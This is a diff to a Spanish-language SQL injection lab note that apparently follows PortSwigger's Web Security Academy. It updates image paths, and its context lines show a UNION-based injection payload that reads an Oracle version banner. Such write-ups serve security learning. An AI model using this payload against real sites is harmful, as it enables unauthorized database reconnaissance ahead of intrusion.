@@ -15,7 +15,7 @@ Este tipo de ataque permite al atacante reconocer el entorno, lo que es clave pa
 Pagina para ayudarte 
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-![Pasted_image_20250701150253.png](Imagenes/Pasted_image_20250701150253.png)
+![Pasted_image_20250701150253.png](/Imagenes/Pasted_image_20250701150253.png)
 Solucion
 ' union select 'a',banner from v$version-- -
-![Pasted_image_20250701150553.png](Imagenes/Pasted_image_20250701150553.png)
+![Pasted_image_20250701150553.png](/Imagenes/Pasted_image_20250701150553.png)
